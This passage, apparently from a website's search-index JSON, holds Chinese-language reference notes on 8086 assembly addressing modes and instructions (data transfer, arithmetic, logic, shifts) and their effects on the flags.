u5bfb\u5740\u65b9\u5f0f","text":"<ul> <li>\u7acb\u5373\u6570\u65b9\u5f0f\uff1a\u5373\u64cd\u4f5c\u6570\u4e3a\u5e38\u6570</li> <li>\u5bc4\u5b58\u5668\u65b9\u5f0f\uff1a\u4ee5\u5bc4\u5b58\u5668\u4e3a\u64cd\u4f5c\u6570</li> <li>\u76f4\u63a5\u5bfb\u5740\uff1a\u901a\u8fc7\u903b\u8f91\u5730\u5740\u8868\u793a\u64cd\u4f5c\u6570\uff0c\u4e14\u504f\u79fb\u5730\u5740\u4e3a\u7acb\u5373\u6570\uff0c\u6bd4\u5982 [1234h]\u3001ss:[1234h]\uff0c\u7701\u7565\u60c5\u51b5\u9ed8\u8ba4 ds</li> <li>\u95f4\u63a5\u5bfb\u5740\uff1a\u903b\u8f91\u5730\u5740\u7684\u504f\u79fb\u5730\u5740\u4ee5\u95f4\u63a5\u5f62\u5f0f\u8868\u793a\uff0c\u65b9\u62ec\u53f7\u5185\u53ea\u80fd\u662f bx bp si di\uff0c\u4e14\u8868\u793a\u4e3a \u57fa\u5740\u5bc4\u5b58\u5668\uff08bx bp \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u53d8\u5740\u5bc4\u5b58\u5668\uff08si di \u9009\u5176\u4e00\u6216\u6ca1\u6709\uff09+ \u4f4d\u79fb\u91cf\uff08\u7acb\u5373\u6570\u6216\u6ca1\u6709\uff09\u7684\u5f62\u5f0f     \u5373 bx bp \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0\uff0csi di \u4e0d\u80fd\u540c\u65f6\u51fa\u73b0     \u7701\u7565\u6bb5\u5730\u5740\u65f6\uff0c\u5982\u679c\u504f\u79fb\u5730\u5740\u5185\u6709 bp \u51fa\u73b0\uff0c\u5219\u7f3a\u7701\u6bb5\u5730\u5740\u4e3a ss\uff0c\u5176\u5b83\u60c5\u51b5\u5747\u4e3a ds     \u6bb5\u5730\u5740\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e00\u822c\u9664 cs ss ds \u5916\u7684\u5176\u5b83\u6bb5\u5730\u5740\u9884\u5148\u5b58\u5728 es \u4e2d\u518d\u5bfb\u5740</li> </ul>"},{"location":"cs/pl/asm/#8086_1","title":"8086 \u6c47\u7f16\u6307\u4ee4","text":"<p>\u5982\u679c\u6307\u4ee4\u4e2d\u6ca1\u6709\u6807\u5fd7\u4f4d\u8868\u683c\uff0c\u5219\u8be5\u6307\u4ee4\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d\u3002\u53f3\u659c\u7ebf\u8868\u793a\u8be5\u6807\u5fd7\u4f4d\u7531\u7ed3\u679c\u51b3\u5b9a\uff0c\u5168\u90e8\u586b\u5145\u4e3a\u6839\u636e\u7279\u6b8a\u610f\u4e49\u8bbe\u5b9a\uff08\u6ce8\u610f\u4e2d\u4f1a\u5177\u4f53\u8bf4\uff09\uff0c\u6253\u53c9\u4e3a undefined\uff08\u4e00\u822c\u4e0d\u53d8\uff09</p>"},{"location":"cs/pl/asm/#_6","title":"\u6570\u636e\u4f20\u9001\u6307\u4ee4","text":""},{"location":"cs/pl/asm/#_7","title":"\u901a\u7528\u6570\u636e\u4f20\u9001\u6307\u4ee4","text":"mov <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1amov a, b</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 b \u7684\u503c\u4f20\u5165 a</li> <li>\u6ce8\u610f\uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0cb \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u3001\u903b\u8f91\u5730\u5740\u6216\u7acb\u5373\u6570\uff0c\u4f46 a b \u6700\u591a\u6709\u4e00\u4e2a\u662f\u903b\u8f91\u5730\u5740\uff0c\u4e14\u5982\u679c\u662f\u5c06\u7acb\u5373\u6570\u4f20\u5165\u903b\u8f91\u5730\u5740\u6240\u6307\u5185\u5b58\u65f6\u8981\u6807\u6ce8\u5927\u5c0f\uff08byte ptr / word ptr\uff09\uff0c\u5e76\u4e14 a b \u5bbd\u5ea6\u9700\u4e00\u81f4\u3002\u4e0d\u80fd\u628a\u7acb\u5373\u6570\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\uff0c\u4e5f\u4e0d\u80fd\u628a\u6bb5\u5bc4\u5b58\u5668\u8d4b\u503c\u7ed9\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d</li> </ul> push <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apush a</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 a \u538b\u5165\u6808\uff0c\u5373 sp = sp - 2, word ptr ss:[sp] = a</li> <li>\u6ce8\u610f\uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u5185\u5bb9\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f\u7acb\u5373\u6570\uff0c\u4e0d\u80fd\u662f fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d</li> </ul> pop <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apop a</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece\u6808\u4e0a\u5f39\u51fa 16 \u4f4d\u6570\u503c\u5230 a \u4e2d\uff0c\u5373 a = word ptr ss:[sp], sp = sp + 2</li> <li>\u6ce8\u610f\uff1aa \u662f\u5bc4\u5b58\u5668\u6216\u8005\u903b\u8f91\u5730\u5740\uff0c\u4e00\u5b9a\u662f 16 \u4f4d\uff0c\u4e0d\u80fd\u662f cs fl\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d</li> </ul> xchg <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1axchg op1, op2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ea4\u6362 op1 op2\uff0c\u5373 tmp = op1, op1 = op2, op2 = tmp</li> <li>\u6ce8\u610f\uff1aop1 op2 \u662f\u5bc4\u5b58\u5668\u6216\u8005\u5185\u5b58\uff0c\u4e0d\u80fd\u90fd\u662f\u5185\u5b58\uff0c\u4e14\u4e0d\u80fd\u662f\u6bb5\u5bc4\u5b58\u5668\u3002\u4e0d\u5f71\u54cd\u4efb\u4f55\u6807\u5fd7\u4f4d</li> </ul>"},{"location":"cs/pl/asm/#_8","title":"\u7aef\u53e3\u8f93\u5165\u8f93\u51fa\u6307\u4ee4","text":"in <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ain acc, port</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece\u7aef\u53e3\u8bfb\u6570\u636e\u5230 al \u6216 ax \u4e2d\uff0c\u5373 acc = [port]\uff08\u7aef\u53e3\u4e2d\u5185\u5bb9\uff09</li> <li>\u6ce8\u610f\uff1aacc \u4e00\u5b9a\u662f al \u6216 ax\uff0cport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff0c\u5982\u679c\u662f\u7acb\u5373\u6570\u5219\u6700\u5927 0FFh\u3002\u662f ax \u5219 [port] \u5b58\u5165 al\uff0c[port+1] \u5b58\u5165 ah</li> </ul> out <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aout port, acc</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u628a al \u6216 ax \u4e2d\u503c\u5199\u5165\u7aef\u53e3\uff0c\u5373 [port] = acc</li> <li>\u6ce8\u610f\uff1aport \u4e00\u5b9a\u662f dx \u6216\u7acb\u5373\u6570\uff08\u7acb\u5373\u6570\u6700\u5927 0FFh\uff09\uff0cacc \u4e00\u5b9a\u662f al \u6216 ax\u3002\u662f ax \u5219 al \u5199\u5165 [port]\uff0cah \u5199\u5165 [port+1]</li> </ul>"},{"location":"cs/pl/asm/#_9","title":"\u5730\u5740\u4f20\u9001\u6307\u4ee4","text":"lea <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alea dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 src \u7684\u6709\u6548\u5730\u5740\u4f20\u5165 dest\uff0c\u5373 dest = offset src</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u5185\u5b58\u53d8\u91cf\u3002\u53d6 src \u7684\u504f\u79fb\u5730\u5740</li> </ul> lds <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alds dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 ds:dest\uff0c\u5373 dest = word ptr [src], ds = word ptr [src+2]</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58</li> </ul> les <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ales dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 src \u5904\u8fdc\u6307\u9488\u88c5\u5165 es:dest\uff0c\u5373 dest = word ptr [src], es = word ptr [src+2]</li> <li>\u6ce8\u610f\uff1adest \u662f\u5bc4\u5b58\u5668\uff0csrc \u662f\u53cc\u5b57\u5927\u5c0f\u5185\u5b58</li> </ul>"},{"location":"cs/pl/asm/#_10","title":"\u6807\u5fd7\u5bc4\u5b58\u5668\u4f20\u9001\u6307\u4ee4","text":"lahf <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1alahf</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 fl \u4f4e 8 \u4f4d\u590d\u5236\u5230 ah\uff0c\u5373 ah = fl &amp; 0FFh</li> </ul> sahf <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asahf</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 ah \u5b58\u5165 fl \u4f4e 8 \u4f4d\uff0c\u5373 fl = (fl &amp; 0FF00h) | 2 | (ah &amp; 0D5h)</li> <li>\u6ce8\u610f\uff1a\u53ea\u4fdd\u7559 ah \u7684 0 2 4 6 7 \u4f4d\uff08cf pf af zf sf\uff09\uff0c\u4e14\u7b2c 1 \u4f4d\u6052\u4e3a 1</li> </ul> OF DF IF TF SF ZF AF PF CF pushf <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apushf</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 fl \u538b\u5165\u5806\u6808\uff0c\u5373 push fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c\uff09</li> </ul> popf <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1apopf</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece\u5806\u6808\u5f39\u51fa 16 \u4f4d\u5230 fl\uff0c\u5373 pop fl\uff08\u4e0d\u80fd\u76f4\u63a5\u6267\u884c</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_11","title":"\u8f6c\u6362\u6307\u4ee4","text":""},{"location":"cs/pl/asm/#_12","title":"\u7b26\u53f7\u6269\u5145\u6307\u4ee4","text":"cbw <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acbw</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06\u5b57\u8282 al \u6269\u5145\u4e3a\u5b57 ax\uff0c\u5373\u5c06 al \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 ah</li> </ul> cwd <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acwd</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06\u5b57 ax \u6269\u5145\u4e3a\u53cc\u5b57 dx:ax\uff08\u76f4\u63a5\u62fc\u63a5\uff09\uff0c\u5373\u5c06 ax \u7b26\u53f7\u4f4d\u6269\u5c55\u5230 dx</li> </ul> xlat <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1axlat</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6362\u7801\u6307\u4ee4\uff0cal = byte ptr ds:[bx+al]</li> <li>\u6ce8\u610f\uff1a\u4e00\u822c\u4f7f ds:bx \u6307\u5411\u4e00\u5f20\u8868\uff0c\u7136\u540e\u529f\u80fd\u5373\u7c7b\u4f3c\u5217\u8868\u7d22\u5f15\u53d6\u503c</li> </ul>"},{"location":"cs/pl/asm/#_13","title":"\u7b97\u6570\u6307\u4ee4","text":""},{"location":"cs/pl/asm/#_14","title":"\u52a0\u6cd5\u6307\u4ee4","text":"add <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aadd dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 src \u52a0\u5230 dest \u4e0a\uff0c\u5373 dest += src</li> <li>\u6ce8\u610f\uff1asrc \u53ef\u4ee5\u662f\u7acb\u5373\u6570/\u5bc4\u5b58\u5668/\u5185\u5b58\uff0cdest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668/\u5185\u5b58\uff0c\u4f46\u4e8c\u8005\u4e0d\u80fd\u90fd\u4e3a\u5185\u5b58\uff0c\u5bbd\u5ea6\u8981\u4e00\u81f4\u3002\u53ef\u80fd\u4f1a\u4ea7\u751f\u8fdb\u4f4d\uff08cf\uff09\u548c\u6ea2\u51fa\uff08of\uff09</li> </ul> OF DF IF TF SF ZF AF PF CF inc <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ainc op</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 op \u52a0\u4e00\uff0c\u5373 op += 1</li> <li>\u6ce8\u610f\uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d</li> </ul> OF DF IF TF SF ZF AF PF CF adc <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aadc dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5e26\u8fdb\u4f4d\u52a0\uff0c\u5373 dest = dest + src + cf</li> <li>\u6ce8\u610f\uff1a\u64cd\u4f5c\u6570\u89c4\u5219\u4e0e add \u76f8\u540c\uff0c\u53ef\u4ee5\u7528\u4e8e\u6a21\u62df 32 \u4f4d\u52a0\u6cd5</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_15","title":"\u51cf\u6cd5\u6307\u4ee4","text":"sub <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asub dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4ece dest \u51cf\u53bb src\uff0c\u5373 dest -= src</li> <li>\u6ce8\u610f\uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0c\u4f1a\u4ea7\u751f\u6ea2\u51fa\uff08of\uff09\uff0c\u501f\u4f4d\u4e5f\u4f1a\u4f7f cf \u53d8 1</li> </ul> OF DF IF TF SF ZF AF PF CF sbb <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asbb dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5e26\u501f\u4f4d\u51cf\uff0cdest = dest - src - cf</li> <li>\u6ce8\u610f\uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add</li> </ul> OF DF IF TF SF ZF AF PF CF dec <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1adec op</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5c06 op \u51cf\u4e00\uff0c\u5373 op -= 1</li> <li>\u6ce8\u610f\uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u4e0d\u5f71\u54cd cf \u4f4d</li> </ul> OF DF IF TF SF ZF AF PF CF neg <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aneg op</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1aop = -op</li> <li>\u6ce8\u610f\uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u975e\u96f6\u6570\u6c42\u8865\u540e cf=1\uff0c0 \u6c42\u8865\u540e cf=0</li> </ul> OF DF IF TF SF ZF AF PF CF cmp <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1acmp op1, op2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u7528 op1 \u51cf op2\uff0c\u4f46\u4e22\u5f03\u7ed3\u679c\u53ea\u5f71\u54cd\u6807\u5fd7\u4f4d</li> <li>\u6ce8\u610f\uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c sub\uff0c\u7528\u4e8e\u5728 jump \u6307\u4ee4\u524d\u7ed9\u51fa\u7b26\u53f7\u4f4d\u4f5c\u4e3a\u6761\u4ef6\u5224\u65ad\u4f9d\u636e\u3002</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_16","title":"\u4e58\u6cd5\u6307\u4ee4","text":"mul <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1amul src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u975e\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u5f53 src \u4e3a 8 \u4f4d\u65f6 ax = al * src\uff0c\u5f53 src \u4e3a 16 \u4f4d\u65f6 dx:ax = ax * src</li> <li>\u6ce8\u610f\uff1asrc \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\u3002\u5982\u679c\u9ad8\u4f4d\uff08\u4e00\u534a\uff09\u662f 0\uff0c\u5219\u5c06 of cf \u7f6e 0\uff0c\u5426\u5219\u7f6e 1</li> </ul> OF DF IF TF SF ZF AF PF CF imul <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aimul src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u7b26\u53f7\u6570\u4e58\u6cd5\uff0c\u4e58\u6cd5\u65b9\u5f0f\u540c mul\uff0c\u4f46\u5c06\u4e24\u4e2a\u4e58\u6570\u548c\u79ef\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_17","title":"\u9664\u6cd5\u6307\u4ee4","text":"div <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1adiv op</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u65e0\u7b26\u53f7\u6570\u9664\u6cd5<ul> <li>\u5f53 op \u4e3a 8 \u4f4d\u65f6\uff0cal = ax / op, ah = ax % op</li> <li>\u5f53 op \u4e3a 16 \u4f4d\u65f6\uff0cax = dx:ax / op, dx = dx:ax % op</li> </ul> </li> <li>\u6ce8\u610f\uff1aop \u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0c\u53ef\u4ee5\u5f97\u5230\u5546\u548c\u4f59\u6570</li> </ul> OF DF IF TF SF ZF AF PF CF idiv <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aidiv</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u7b26\u53f7\u6570\u9664\u6cd5\uff0c\u9664\u6cd5\u64cd\u4f5c\u540c div\uff0c\u4f46\u5c06\u9664\u6570\u3001\u88ab\u9664\u6570\u3001\u5546\u548c\u4f59\u6570\u90fd\u89c6\u4e3a\u7b26\u53f7\u6570</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_18","title":"\u903b\u8f91\u8fd0\u7b97\u6307\u4ee4","text":"and <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aand dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6309\u4f4d\u4e0e\u8fd0\u7b97\uff0cdest = dest &amp; src, of=0, cf=0</li> <li>\u6ce8\u610f\uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf</li> </ul> OF DF IF TF SF ZF AF PF CF or <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aor dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6309\u4f4d\u6216\u8fd0\u7b97\uff0cdest = dest | src, of=0, cf=0</li> <li>\u6ce8\u610f\uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf</li> </ul> OF DF IF TF SF ZF AF PF CF xor <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1axor dest, src</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u6309\u4f4d\u5f02\u6216\u8fd0\u7b97\uff0cdest = dest ^ src, of=0, cf=0</li> <li>\u6ce8\u610f\uff1a\u64cd\u4f5c\u6570\u683c\u5f0f\u540c add\uff0cof \u548c cf \u90fd\u4f1a\u7f6e 0\uff0c\u4f46\u4f1a\u5f71\u54cd zf</li> </ul> OF DF IF TF SF ZF AF PF CF not <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1anot op</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5bf9 op \u6309\u4f4d\u6c42\u53cd\uff0cop = ~op</li> <li>\u6ce8\u610f\uff1aop \u4e3a\u5bc4\u5b58\u5668\u6216\u5185\u5b58</li> </ul> test <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1atest op1, op2</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u4f4d\u6d4b\u8bd5\uff0cop1 &amp; op2 \u4e22\u5f03\u7ed3\u679c\u4ec5\u5f71\u54cd\u7b26\u53f7\u4f4d</li> <li>\u6ce8\u610f\uff1a\u4e3b\u8981\u7528\u5230 zf \u7684\u53d8\u5316\uff0c\u4e3a jz jnz \u63d0\u4f9b zf</li> </ul> OF DF IF TF SF ZF AF PF CF"},{"location":"cs/pl/asm/#_19","title":"\u79fb\u4f4d\u6307\u4ee4","text":"shl <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ashl dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5bf9 dest \u903b\u8f91\u5de6\u79fb count \u4f4d\uff0c\u53f3\u4fa7\u8865 0\uff0c\u5de6\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09</li> <li>\u6807\u5fd7\u4f4d\uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined</li> </ul> OF DF IF TF SF ZF AF PF CF shr <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1ashr dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5bf9 dest \u903b\u8f91\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865 0\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09</li> <li>\u6807\u5fd7\u4f4d\uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined</li> </ul> OF DF IF TF SF ZF AF PF CF sal <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asal dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5bf9 dest \u7b97\u6570\u5de6\u79fb count \u4f4d\uff0c\u540c\u903b\u8f91\u5de6\u79fb</li> <li>\u6ce8\u610f\uff1a\u4e0e shl \u5b8c\u5168\u76f8\u540c</li> <li>\u6807\u5fd7\u4f4d\uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined</li> </ul> OF DF IF TF SF ZF AF PF CF sar <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1asar dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5bf9 dest \u7b97\u6570\u53f3\u79fb count \u4f4d\uff0c\u5de6\u4fa7\u8865\u7b26\u53f7\u4f4d\uff0c\u53f3\u4fa7\u6700\u540e\u6ea2\u51fa\u7684\u4e00\u4f4d\u843d\u5165 cf</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09</li> <li>\u6807\u5fd7\u4f4d\uff1a\u82e5 count \u4e3a 0\uff0c\u5219\u4e0d\u5f71\u54cd sf zf af pf\uff0c\u5426\u5219\u6839\u636e\u7ed3\u679c\u8bbe\u7f6e\uff08af \u4e3a undefined\uff09\uff0ccf \u4e3a\u79fb\u51fa\u7684\u6700\u540e\u4e00\u4f4d\uff0c\u5f53 count \u4e3a 1 \u65f6\uff0c\u5982\u679c\u7ed3\u679c\u7684\u6700\u9ad8\u4f4d\u548c cf \u76f8\u540c\u5219 of \u4e3a 0 \u53cd\u4e4b\u4e3a 1\uff0c\u5f53 count \u4e0d\u4e3a 1 \u65f6 of \u4e3a undefined</li> </ul> OF DF IF TF SF ZF AF PF CF rol <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1arol dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5bf9 dest \u5faa\u73af\u5de6\u79fb count \u4f4d\uff0c\u6700\u9ad8\u4f4d\u56de\u5230\u6700\u4f4e\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf \u4e0e\u7ed3\u679c\u6700\u9ad8\u4f4d\u7684\u5f02\u6216</li> </ul> OF DF IF TF SF ZF AF PF CF ror <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1aror dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5bf9 dest \u5faa\u73af\u53f3\u79fb count \u4f4d\uff0c\u6700\u4f4e\u4f4d\u56de\u5230\u6700\u9ad8\u4f4d\u540c\u65f6\u79fb\u5230 cf \u4e2d</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a\u4e24\u4e2a\u6700\u9ad8\u4f4d\u7684\u5f02\u6216</li> </ul> OF DF IF TF SF ZF AF PF CF rcl <ul> <li>\u6307\u4ee4\u683c\u5f0f\uff1arcl dest, count</li> <li>\u6307\u4ee4\u4f5c\u7528\uff1a\u5e26\u8fdb\u4f4d\u5faa\u73af\u5de6\u79fb\uff0c\u5373 cf \u52a0\u5728 dest \u5de6\u4fa7\u4e00\u8d77\u5faa\u73af\u5de6\u79fb</li> <li>\u6ce8\u610f\uff1adest \u53ef\u4ee5\u662f\u5bc4\u5b58\u5668\u6216\u5185\u5b58\uff0ccount \u662f 1 \u6216 cl\uff088086 \u91cc\u4e0d\u80fd\u4e3a\u5176\u5b83\u5185\u5bb9\uff09\u3002\u5982\u679c\u79fb\u4f4d\u5927\u4e8e 1 \u65f6\uff0cof undefined\uff0c\u5426\u5219 of \u4e3a cf 